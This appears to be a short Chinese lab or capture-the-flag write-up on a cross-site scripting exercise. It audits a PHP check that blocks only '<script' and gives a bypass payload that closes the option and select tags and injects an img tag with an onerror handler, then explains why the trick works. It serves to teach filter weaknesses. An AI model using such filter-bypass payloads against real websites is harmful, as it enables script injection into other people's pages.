## 源码审计

```php
if (stripos($_GET['default'], "<script") !== false) {  // ← 只这一条
    header("location: ?default=English");
    exit;
}
```

**结论：只拦 `<script`，`<img>` `<svg>` `<body>` 全不过滤。**

## 绕过

```payload
?default=English</option></select><img src=x onerror=alert(1)>
```

先用 `</option></select>` 逃出表单容器，再放 `<img>`。

## 知识点

`<img onerror>` 在 `<option>` 内部也能触发——事件处理器不受父标签限制。`<script>` 在 `<option>` 内则被浏览器静默忽略。
